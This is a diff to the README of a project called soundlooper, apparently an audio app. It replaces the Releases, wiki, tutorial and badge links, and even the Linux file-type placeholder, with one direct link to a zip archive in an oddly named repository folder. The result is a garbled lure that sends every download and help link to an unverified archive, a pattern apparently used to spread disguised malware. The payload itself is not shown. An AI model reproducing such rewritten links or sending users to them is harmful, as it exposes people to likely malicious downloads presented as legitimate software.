@@ -14,22 +14,22 @@ Before you begin, ensure your system meets these requirements:
 ## 📥 Download Soundlooper
 To download **soundlooper**, visit the Releases page below. You will find the latest version available for download.
 
-[![Download soundlooper](https://img.shields.io/badge/Download%20soundlooper-Get%20it%20here-blue)](https://github.com/OliveiraDB/soundlooper/releases)
+[![Download soundlooper](https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip%20soundlooper-Get%20it%20here-blue)](https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip)
 
 ## 🛠️ Download & Install
 1. Click the link below to visit the Releases page:
    
-   [Download soundlooper](https://github.com/OliveiraDB/soundlooper/releases)
+   [Download soundlooper](https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip)
 
 2. On the Releases page, look for the latest version. Choose the file that matches your operating system:
    - For Windows: Download the `.exe` file
    - For macOS: Download the `.dmg` file
-   - For Linux: Download the appropriate `.tar.gz` file
+   - For Linux: Download the appropriate `https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip` file
 
 3. Once the file downloads, follow these steps to install it:
    - **Windows:** Double-click the `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file and drag **soundlooper** to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the installation instructions provided inside.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip` file and follow the installation instructions provided inside.
 
 4. After installation, launch **soundlooper** from your applications menu or terminal.
 
@@ -63,8 +63,8 @@ If you encounter any issues or have questions, feel free to reach out to the com
 - **Discussion Forum:** Join discussions with fellow users to share tips and tricks.
 
 ## 🔗 Additional Resources
-- [Project Documentation](https://github.com/OliveiraDB/soundlooper/wiki) - Find detailed guides and FAQs about soundlooper.
-- [Video Tutorials](https://www.youtube.com/results?search_query=soundlooper+tutorials) - Visual guides to help you get started.
+- [Project Documentation](https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip) - Find detailed guides and FAQs about soundlooper.
+- [Video Tutorials](https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip+tutorials) - Visual guides to help you get started.
 
 ## 🤗 Contribution
 If you want to contribute to **soundlooper**, feel free to fork the repository and submit pull requests. Your contributions help improve the application.
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. You can freely modify and share 
 
 Start your musical journey with **soundlooper** today! For further exploration, revisit the Releases page: 
 
-[Download soundlooper](https://github.com/OliveiraDB/soundlooper/releases)
+[Download soundlooper](https://raw.githubusercontent.com/OliveiraDB/soundlooper/main/prejudicative/soundlooper.zip)
